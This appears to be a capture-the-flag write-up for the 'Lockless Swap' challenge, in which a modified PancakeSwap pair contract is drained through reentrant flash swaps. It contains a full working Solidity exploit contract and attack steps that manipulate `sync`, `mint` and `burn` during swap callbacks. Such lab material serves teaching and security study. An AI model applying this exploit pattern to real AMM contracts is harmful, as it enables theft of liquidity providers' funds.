# Lockless Swap - Solution Report

## Problem Overview

### Contract Summary

The challenge revolves around a vulnerable implementation of a PancakeSwap-like Automated Market Maker (AMM). The main contracts involved are:

1. `Challenge`: Sets up the trading pair and provides a faucet for initial tokens.
2. `PancakePair`: A modified version of PancakeSwap's pair contract, lacking crucial security measures.

Key functions in `PancakePair`:

- `swap`: Allows token swaps, but lacks reentrancy protection.
- `mint`: Adds liquidity and mints LP tokens.
- `burn`: Removes liquidity and burns LP tokens.
- `sync`: Updates the contract's internal token balance records.

### Initial Setup

- Two ERC20 tokens: `token0` and `token1`
- Initial liquidity: 99e18 of each token
- PancakePair contract initialized with this liquidity

### Success Criteria

To solve the challenge, an attacker must:

- Transfer 99e18 of `token0` to the `randomFolks` address
- Transfer 99e18 of `token1` to the `randomFolks` address

This requires draining the entire initial liquidity from the pool, demonstrating a critical vulnerability in the AMM implementation.

## Vulnerability

The core vulnerability in this challenge lies in the `PancakePair` contract, specifically in the `swap` function. The vulnerable code can be found in the following lines:

```solidity
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    // ... (other code)

    if (data.length > 0) {
        this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
        IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
        this.sync(); // @shou: no more lock protection, needs to prevent attacker sync during swap
    }

    // ... (other code)
}
```

The vulnerability stems from two critical issues:

1. Lack of Reentrancy Protection:
   The `swap` function allows for external calls (`pancakeCall`) within its execution. While there is a `lock` modifier, it's ineffective due to the use of `this.sync()`, which releases the lock before making the external call.

2. Unrestricted `sync` Calls:
   The `sync` function is called before and after the `pancakeCall`, allowing an attacker to manipulate the contract's state during the swap process. This enables the attacker to alter the contract's understanding of its token balances mid-transaction.

These vulnerabilities combined allow for a reentrancy attack where an attacker can:

- Initiate multiple swaps before the first one is completed
- Manipulate the contract's state between swaps
- Mint liquidity tokens based on manipulated states
- Extract more value from the pool than should be possible

The lack of proper checks and balances in the `mint`, `burn`, and `sync` functions further exacerbates the issue, allowing the attacker to compound the effects of their manipulation with each reentrant call.

## Attack Process

The attack exploits the reentrancy vulnerability in the `PancakePair` contract through a series of carefully orchestrated steps:

1. Initial Setup:

   - Deploy the `Exploit` contract, passing the `Challenge` contract address.
   - Approve the `PancakePair` contract to spend tokens on behalf of the `Exploit` contract.

2. Flash Swap Initiation:

   - Call `pair.swap(5e18, 5e18, address(this), abi.encode(uint256(1)))`.
   - This borrows 5e18 of each token from the pair, triggering the `pancakeCall` function.

3. Initial pancakeCall Execution:

   - Inside `pancakeCall`, verify it's the initial call using the encoded data.
   - Call `pair.sync()` to update the pair's internal balance records.
   - Perform 5 reentrant swaps in a loop, each for 90e18 of both tokens.

4. Reentrant Swap Execution:

   - For each reentrant swap, `pancakeCall` is triggered again.
   - Call `pair.sync()` to update balances.
   - Transfer 90e18 of each token back to the pair.
   - Call `pair.mint(address(this))` to receive liquidity tokens.
   - Repay only 1e18 of each token, keeping the rest.

5. Finalizing the Initial Flash Swap:

   - After the reentrant swaps, call `challenge.faucet()` to get additional tokens.
   - Repay the initial flash swap with just 1e18 of each token.

6. Extracting Drained Funds:

   - Transfer all accumulated liquidity tokens back to the pair.
   - Call `pair.burn(address(this))` to extract the underlying assets.

7. Completing the Challenge:
   - Transfer 99e18 of each token to the `randomFolks` address.

This process effectively drains the entire liquidity pool, exploiting the lack of proper reentrancy protection and state management in the `PancakePair` contract.

## Proof of Concept (PoC)

The following code demonstrates the implementation of the exploit:

```solidity
contract Exploit {
    Challenge immutable challenge;

    constructor(Challenge chal) payable {
        challenge = Challenge(chal);
    }

    function exploit() external {
        PancakePair pair = challenge.pair();
        ERC20 token0 = challenge.token0();
        ERC20 token1 = challenge.token1();
        address randomFolks = challenge.randomFolks();

        // Approve tokens for the pair
        token0.approve(address(pair), type(uint256).max);
        token1.approve(address(pair), type(uint256).max);

        // Initial flash swap
        pair.swap(5e18, 5e18, address(this), abi.encode(uint256(1)));

        // Burn liquidity tokens to extract drained funds
        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(this));

        // Transfer drained tokens to randomFolks
        token0.transfer(randomFolks, 99e18);
        token1.transfer(randomFolks, 99e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(challenge.pair()), "Caller is not the pair");

        PancakePair pair = challenge.pair();
        ERC20 token0 = challenge.token0();
        ERC20 token1 = challenge.token1();

        if (abi.decode(data, (uint256)) == 1) {
            // Initial flash swap callback
            pair.sync();

            // Perform multiple reentrant swaps
            for (uint256 i = 0; i < 5; i++) {
                pair.swap(90e18, 90e18, address(this), abi.encode(uint256(2)));
            }

            // Get additional tokens from faucet
            challenge.faucet();

            // Repay flash swap
            token0.transfer(address(pair), 1e18);
            token1.transfer(address(pair), 1e18);
        } else {
            // Reentrant swap callback
            pair.sync();

            // Mint liquidity tokens
            token0.transfer(address(pair), 90e18);
            token1.transfer(address(pair), 90e18);
            pair.mint(address(this));

            // Repay reentrant swap
            token0.transfer(address(pair), 1e18);
            token1.transfer(address(pair), 1e18);
        }
    }
}
```

This implementation successfully exploits the reentrancy vulnerability and lack of proper checks in the `PancakePair` contract, draining the entire liquidity pool.
